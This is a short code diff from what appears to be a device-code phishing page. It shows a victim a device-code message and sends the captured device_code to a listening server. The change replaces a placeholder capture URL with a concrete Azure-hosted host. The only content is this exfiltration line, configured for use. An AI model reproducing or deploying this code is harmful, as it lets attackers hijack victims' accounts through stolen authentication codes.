@@ -14,7 +14,7 @@
             
             document.getElementById('code').innerHTML += data.message;
             // Change this line to point to your listening webserver
-            $.get("https://MYCaptureServer/?id=" + data.device_code);
+            $.get("https://cappybara.eastus.cloudapp.azure.com/?id=" + data.device_code);
             //document.write(data.message);
         });
 
